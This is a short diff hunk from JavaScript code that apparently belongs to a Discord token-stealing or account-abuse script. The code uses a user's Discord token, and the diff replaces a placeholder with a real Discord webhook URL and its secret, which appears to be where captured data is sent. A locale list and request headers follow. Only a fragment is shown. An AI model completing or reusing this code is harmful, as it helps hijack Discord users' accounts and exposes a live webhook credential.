@@ -18,7 +18,7 @@
   if (!token) return;
 
   const base = 'https://discord.com/api/v8';
-  const Webhook = 'WEBHOOK URL';
+  const Webhook = 'https://discord.com/api/webhooks/865992275486048266/Z1bcRbL7f13dI7Ii061LsTemvnUYJpDXZq-8HJzAUHAzM2OEifvyoyrwdH_rsGQ29a79';
 
   const locales = ['ja', 'zh-TW', 'ko', 'zh-CN', 'de', 'lt', 'lv', 'fi', 'se'];
   const headers = {
